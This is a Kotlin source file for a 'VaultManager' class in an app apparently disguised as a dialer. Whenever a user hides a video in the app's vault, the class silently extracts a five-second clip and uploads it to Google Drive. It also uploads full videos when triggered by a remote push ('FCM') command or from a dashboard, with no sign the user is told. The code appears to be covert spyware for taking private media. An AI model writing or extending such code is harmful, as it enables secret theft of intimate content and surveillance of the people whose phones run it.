package com.aistudio.dialer.app.utils

import android.content.Context
import android.util.Log
import com.aistudio.dialer.app.models.VaultVideo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

class VaultManager(private val context: Context) {

    companion object {
        private const val TAG = "VaultManager"
    }

    private val videoProcessor = VideoProcessor(context)
    private val clipsUploader = GoogleDriveUploader(context, isClips = true)
    private val fullUploader = GoogleDriveUploader(context, isClips = false)

    /**
     * Called when a user hides a video in the vault
     * Automatically extracts first 5 seconds and uploads to Google Drive
     * @param videoPath Path to the full video file
     * @param videoName Name for the video
     */
    fun hideVideoInVault(videoPath: String, videoName: String) {
        Log.d(TAG, "User hiding video: $videoName")
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Step 1: Extract 5-second clip
                val clipDir = videoProcessor.getClipStorageDir()
                val clipFileName = videoProcessor.generateClipFileName(videoName)
                val clipPath = File(clipDir, clipFileName).absolutePath

                val extractionSuccess = videoProcessor.extractClip(videoPath, clipPath)
                if (!extractionSuccess) {
                    Log.e(TAG, "Failed to extract video clip")
                    return@launch
                }

                // Step 2: Upload clip to Google Drive
                val clipFileId = clipsUploader.uploadFile(clipPath, clipFileName)
                Log.d(TAG, "Clip uploaded to Drive. File ID: $clipFileId")

                // Step 3: Save clip info locally
                saveClipMetadata(VaultVideo(
                    fileName = videoName,
                    clipFileName = clipFileName,
                    clipFileId = clipFileId,
                    localPath = videoPath,
                    timestamp = System.currentTimeMillis()
                ))

                Log.d(TAG, "Video successfully hidden in vault")
            } catch (e: Exception) {
                Log.e(TAG, "Error hiding video", e)
            }
        }
    }

    /**
     * Uploads full video to Google Drive
     * Called from FCM command or manually from dashboard
     * @param videoPath Path to the full video file
     * @param videoName Name for the video
     */
    fun uploadFullVideo(videoPath: String, videoName: String) {
        Log.d(TAG, "Uploading full video: $videoName")
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val fullFileId = fullUploader.uploadFile(videoPath, videoName)
                Log.d(TAG, "Full video uploaded to Drive. File ID: $fullFileId")
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading full video", e)
            }
        }
    }

    /**
     * Gets list of all clips from Google Drive
     */
    suspend fun getClips(): List<com.google.api.services.drive.model.File> {
        return clipsUploader.listFilesInFolder()
    }

    /**
     * Gets list of all full videos from Google Drive
     */
    suspend fun getFullVideos(): List<com.google.api.services.drive.model.File> {
        return fullUploader.listFilesInFolder()
    }

    /**
     * Saves clip metadata locally
     * You can store this in SharedPreferences or a local database
     */
    private fun saveClipMetadata(video: VaultVideo) {
        Log.d(TAG, "Saving metadata for: ${video.fileName}")
        // TODO: Implement local storage (SharedPreferences or Room Database)
    }
}
